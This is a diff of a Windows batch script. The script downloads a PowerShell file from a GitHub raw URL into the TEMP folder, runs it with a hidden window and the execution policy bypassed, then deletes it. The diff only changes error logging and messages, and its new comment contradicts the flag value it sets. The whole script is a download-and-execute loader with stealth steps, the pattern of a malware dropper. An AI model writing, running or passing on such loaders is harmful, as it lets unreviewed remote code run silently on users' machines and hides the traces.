@@ -1,8 +1,8 @@
 @echo off
 setlocal EnableDelayedExpansion
 
-:: Initialize error flag to False
-set "errorFlag=True"
+:: Initialize error flag to True, assuming an error will occur
+set "errorFlag=False"
 
 :: Set TEMP_DIR to the TEMP folder
 set TEMP_DIR=%TEMP%
@@ -11,7 +11,7 @@ set TEMP_DIR=%TEMP%
 echo Downloading script...
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/madhead341/KickAss/refs/heads/main/main.ps1', '%TEMP%\script.ps1')"
 if %ERRORLEVEL% neq 0 (
-    echo Error downloading the script. > "%TEMP%\error.log"
+    echo Error downloading the script.
     set "errorFlag=True"
     goto :end
 )
@@ -20,7 +20,7 @@ if %ERRORLEVEL% neq 0 (
 echo Running script in background...
 powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%TEMP%\script.ps1"
 if %ERRORLEVEL% neq 0 (
-    echo Error running the script. > "%TEMP%\error.log"
+    echo Error running the script.
     set "errorFlag=True"
     goto :end
 )
@@ -28,7 +28,7 @@ if %ERRORLEVEL% neq 0 (
 :: Clean up the script file after execution
 del "%TEMP%\script.ps1"
 if %ERRORLEVEL% neq 0 (
-    echo Error deleting the script file. > "%TEMP%\error.log"
+    echo Error deleting the script file.
     set "errorFlag=True"
     goto :end
 )
@@ -36,9 +36,9 @@ if %ERRORLEVEL% neq 0 (
 :end
 :: Check the status and log the result
 if %errorFlag%==True (
-    echo An error occurred during the process. Check error.log for details.
+    echo An error occurred during the process.
 ) else (
-    echo The script ran successfully.
+    echo Success
 )
 
 exit /b
